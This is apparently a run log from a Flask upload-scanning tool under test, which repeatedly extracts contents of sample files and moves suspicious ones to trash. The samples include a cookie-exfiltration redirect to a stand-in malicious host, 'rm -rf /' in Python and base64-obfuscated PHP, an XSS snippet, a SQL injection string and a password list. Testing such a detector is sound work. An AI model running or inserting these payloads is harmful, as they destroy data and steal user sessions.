2025-02-22 20:47:56,659 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:47:56,660 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:47:56,662 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:47:56,665 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:47:56,667 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:47:56,668 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:47:56,670 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:47:56,672 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:47:56,674 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:47:56,676 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:47:56,677 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:47:56,679 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:47:56,681 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:47:56,683 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:47:56,685 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:47:56,686 - Extracted content from uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:47:56,688 - Extracted content from uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:47:56,690 - Extracted content from uploads/test/test/1.sql: SELECT * FROM users WHERE username = 'admin' OR '1'='1';

2025-02-22 20:47:56,690 - Malicious pattern detected in uploads/test/test/1.sql
2025-02-22 20:47:56,690 - Moved 1.sql to trash due to suspicious content.
2025-02-22 20:47:56,691 - Extracted content from uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:47:56,693 - Extracted content from uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:47:56,695 - Extracted content from uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:47:56,696 - Extracted content from uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:47:56,698 - Extracted content from uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:47:56,700 - Extracted content from uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:47:56,701 - Extracted content from uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:47:56,706 - [31m[1mWARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead.[0m
 * Running on http://127.0.0.1:5000
2025-02-22 20:47:56,706 - [33mPress CTRL+C to quit[0m
2025-02-22 20:48:04,515 - 127.0.0.1 - - [22/Feb/2025 20:48:04] "GET / HTTP/1.1" 200 -
2025-02-22 20:48:10,460 - Extracted content from uploads/1/1.sql: SELECT * FROM users WHERE username = 'admin' OR '1'='1';

2025-02-22 20:48:10,460 - Malicious pattern detected in uploads/1/1.sql
2025-02-22 20:48:10,460 - Moved 1.sql to trash due to suspicious content.
2025-02-22 20:48:10,465 - 127.0.0.1 - - [22/Feb/2025 20:48:10] "[32mPOST /upload HTTP/1.1[0m" 302 -
2025-02-22 20:48:10,474 - 127.0.0.1 - - [22/Feb/2025 20:48:10] "GET / HTTP/1.1" 200 -
2025-02-22 20:49:14,215 - Extracted content from uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:49:14,220 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:49:14,222 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:49:14,224 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:49:14,226 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:49:14,227 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:49:14,229 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:49:14,230 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:49:14,231 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:49:14,232 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:49:14,238 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:49:14,239 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:49:14,241 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:49:14,243 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:49:14,245 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:49:14,248 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:49:14,249 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:49:14,250 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:49:14,251 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:49:14,253 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:49:14,254 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:49:14,255 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:49:14,261 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:49:14,262 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:49:14,264 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:49:14,267 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:49:14,269 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:49:14,272 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:49:14,273 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:49:14,274 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:49:14,276 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:49:14,277 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:49:14,278 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:49:14,279 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:49:14,285 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:49:14,286 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:49:14,287 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:49:14,289 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:49:14,290 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:49:14,291 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:49:14,292 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:49:14,293 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:49:14,294 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:49:14,296 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:49:14,297 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:49:14,298 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:49:14,299 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:49:14,301 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:49:14,302 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:49:14,303 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:49:14,305 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:49:14,306 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:49:14,308 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:49:14,310 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:49:14,311 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:49:14,313 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:49:14,315 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:49:14,316 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:49:14,318 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:49:14,320 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:49:14,322 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:49:14,324 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:49:14,325 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:49:14,327 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:49:14,330 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:49:14,331 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:49:14,334 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:49:14,335 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:49:14,336 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:49:14,337 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:49:14,338 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:49:14,339 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:49:14,340 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:49:14,345 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:49:14,346 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:49:14,347 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:49:14,350 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:49:14,351 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:49:14,354 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

